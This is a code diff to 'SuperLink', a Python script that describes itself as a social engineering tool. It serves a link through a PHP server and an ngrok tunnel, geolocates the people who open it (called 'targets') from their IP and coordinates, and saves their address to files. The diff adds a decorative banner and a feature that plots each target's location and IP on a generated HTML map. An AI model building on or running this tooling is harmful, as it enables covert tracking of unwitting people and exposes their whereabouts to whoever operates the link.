@@ -3,6 +3,7 @@ from json import loads
 from os import getcwd, listdir, name, remove, stat, system
 from pathlib import Path
 from platform import uname
+from random import choice
 from subprocess import Popen
 from sys import exit, version_info
 from time import sleep
@@ -19,6 +20,7 @@ from Modules.editIndexFile import EditIndexFile
 from Modules.geocodingAPI import Geocoding
 from Modules.geoip import GeolocationIP
 from Modules.loadTemplates import loadTemplatePath
+from Modules.mapMaker import MapMaker
 from Modules.notifier import TelegramBot
 from Modules.timeOptions import TimeOptions
 
@@ -26,7 +28,8 @@ if name == "nt":
     try:
         from win10toast import ToastNotifier
     except ModuleNotFoundError:
-        print("\n[!] Please install (win10toast) module with\npip install win10toast==0.9")
+        print(
+            "\n[!] Please install (win10toast) module with\npip install win10toast==0.9")
         exit()
 
 LG = Fore.LIGHTGREEN_EX  # light green
@@ -36,6 +39,15 @@ LW = Fore.LIGHTWHITE_EX  # light white
 LC = Fore.LIGHTCYAN_EX  # light cyan
 LB = Fore.LIGHTBLUE_EX  # light blue
 Y = Fore.YELLOW  # yellow
+COLORS = [
+    LG,
+    LR,
+    LY,
+    LW,
+    LC,
+    LB,
+    Y
+]
 
 parser = ArgumentParser()
 parser.add_argument("-p", "--port",
@@ -43,21 +55,19 @@ parser.add_argument("-p", "--port",
                     help="The port for PHP server & ngrok tunnel [ Default : 9090 ]")
 args = parser.parse_args()
 PORT = args.port
-script_version = "1.4.4"
-script_title = f"SuperLink - v{script_version} - By IHosseini"
 
+__author__ = "IHosseini"
+__version__ = "1.4.4"
 
-def banner():
-    tm_settitle(script_title)
-    tm_cleaner()
-    neofetch()
+script_title = f"SuperLink - v{__version__} - By {__author__}"
 
 
 def check_py_version():
     py_version = version_info
     if py_version[0] >= 3:
         if py_version[1] < 8:
-            print(LR + "[!] This script requires at least python3.8 to work fine!")
+            print(
+                LR + "[!] This script requires at least python3.8 to work fine!")
             exit()
     else:
         print(LR + "[!] This script only works for Python3 or later!")
@@ -83,8 +93,20 @@ def win10_notify(
             notify.show_toast(title, msg, icon, duration, threaded)
 
 
-def neofetch():
-    system("neofetch -c green -ac red" if name == "nt" else "neofetch")
+def superlink_art():
+    art = rf"""
+    ____                    __   _      __  
+   / __/_ _____  ___ ____  / /  (_)__  / /__ ©
+  _\ \/ // / _ \/ -_) __/ / /__/ / _ \/  '_/
+ /___/\_,_/ .__/\__/_/   /____/_/_//_/_/\_\ 
+         /_/            
+                             
+ v{__version__}
+ Social Engineering Tool By {__author__}.
+    """
+    for line in art.splitlines():
+        color = choice(COLORS)
+        print(color + line)
 
 
 def tm_settitle(title: str):
@@ -94,6 +116,12 @@ def tm_settitle(title: str):
 
 def tm_cleaner():
     system("cls" if name == "nt" else "clear")
+
+
+def banner():
+    tm_settitle(script_title)
+    tm_cleaner()
+    superlink_art()
 
 
 def list_files(dir_path: str = None):
@@ -351,6 +379,7 @@ class MainServer:
         self.t_print = TmPrint()
         self.time_opt = TimeOptions()
         self.geocoding = Geocoding()
+        self.maper = MapMaker()
 
     def create_data_link(self):
         banner()
@@ -422,7 +451,7 @@ class MainServer:
         if name == "nt":
             with open("./Logs/PHP-Log/TERMINATE_PHP_LOG.log", "w", encoding="UTF-8") as kill_process:
                 Popen(("taskkill", "/F", "/IM", "php*"),
-                       stdout=kill_process, stderr=kill_process)
+                      stdout=kill_process, stderr=kill_process)
         else:
             with open("./Logs/PHP-Log/TERMINATE_PHP_LOG.log", "w", encoding="UTF-8") as kill_process:
                 Popen(("pkill", "php"), stdout=kill_process, stderr=kill_process)
@@ -519,6 +548,12 @@ class MainServer:
                                     address = address["display_name"]
                                     target_info.write(
                                         f"-> Human-Readable Address: {address}")
+                                    self.maper.popup(f"<b>{address}</b>")
+                                    self.maper.zoom_start(13)
+                                    self.maper.tooltip(f"<b>{target_ip}</b><br>[CLICK FOR INFO]")
+                                    self.maper.generate([longitude, latitude],
+                                                        marker=True, save_to_index=True,
+                                                        index_name=f"./Target-Data/{self.time_opt.calendar}_T{number_of_target}_Location.html")
                                 with open(file_path_loc, "w", encoding="UTF-8") as loc_file:
                                     loc_file.write("")
                                 t_print.out(LG + " [>] Target Location data successfully appended to " +
